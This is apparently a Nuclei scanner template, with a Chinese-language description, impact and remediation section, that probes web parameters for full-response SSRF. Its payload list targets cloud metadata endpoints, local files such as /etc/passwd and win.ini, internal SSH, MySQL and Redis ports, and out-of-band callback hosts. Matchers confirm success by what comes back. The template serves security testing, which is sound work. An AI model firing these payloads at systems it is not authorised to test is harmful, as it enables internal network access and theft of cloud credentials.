id: response-ssrf

info:
  name: 完整响应 SSRF 探测（DAST）
  author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
  severity: high
  description: |
    完整响应 SSRF 表示服务端不仅会访问攻击者指定的 URL，还会把目标响应内容返回给客户端。模板将可疑 URL 参数替换为受控地址或内网探测目标，并通过响应中的标记、状态或内容确认服务端请求结果可回显。
  impact: |
    - 攻击者可直接读取内网 HTTP 服务、云元数据、管理面板或文件服务响应，造成敏感信息泄露。
    - 可回显 SSRF 更容易被用来枚举端口、绕过网络边界和窃取临时云凭据。
  remediation: |
    - 服务端请求必须限定目标域名、协议和端口，并阻断内网、环回、链路本地和云元数据网段。
    - 禁止把服务端抓取结果原样返回给用户，对必要代理功能增加认证、响应裁剪和审计。
  reference:
    - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
  metadata:
    max-request: 12
  tags: ssrf,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      ssrf:
        - 'http://{{interactsh-url}}'
        - 'http://{{FQDN}}.{{interactsh-url}}'
        - 'http://{{FQDN}}@{{interactsh-url}}'
        - 'http://{{interactsh-url}}#{{FQDN}}'
        - 'http://{{RDN}}.{{interactsh-url}}'
        - 'http://{{RDN}}@{{interactsh-url}}'
        - 'http://{{interactsh-url}}#{{RDN}}'
        - 'file:////./etc/./passwd'
        - 'file:///c:/./windows/./win.ini'
        - 'http://metadata.tencentyun.com/latest/meta-data/'
        - 'http://100.100.100.200/latest/meta-data/'
        - 'http://169.254.169.254/latest/meta-data/'
        - 'http://169.254.169.254/metadata/v1'
        - 'http://127.0.0.1:22'
        - 'http://127.0.0.1:3306'
        - 'dict://127.0.0.1:6379/info'

    fuzzing:
      - parts:
          - query
          - body
        mode: single
        keys:
          - callback
          - continue
          - data
          - dest
          - dir
          - domain
          - feed
          - file
          - host
          - html
          - imgurl
          - navigation
          - next
          - open
          - out
          - page
          - path
          - port
          - redirect
          - reference
          - return
          - show
          - site
          - to
          - uri
          - url
          - val
          - validate
          - view
          - window
        fuzz:
          - "{{ssrf}}"

      - parts:
          - query
          - body
        mode: single
        values:
          - "(https|http|file)(%3A%2F%2F|://)(.*?)"
        fuzz:
          - "{{ssrf}}"

    stop-at-first-match: true
    matchers-condition: or
    matchers:

      - type: word
        part: body
        words:
          - "Interactsh Server"

      - type: regex
        part: body
        regex:
          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'

      - type: regex
        part: body
        regex:
          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'

      - type: regex
        part: body
        regex:
          - '(\d.\d.\d)(.*?)mysql_native_password'

      - type: regex
        part: body
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'

      - type: word
        part: body
        words:
          - 'for 16-bit app support'

      - type: regex
        part: body
        regex:
          - 'dns-conf\/[\s\S]+instance\/'

      - type: regex
        part: body
        regex:
          - 'app-id[\s\S]+placement\/'

      - type: regex
        part: body
        regex:
          - 'ami-id[\s\S]+placement\/'

      - type: regex
        part: body
        regex:
          - 'id[\s\S]+interfaces\/'
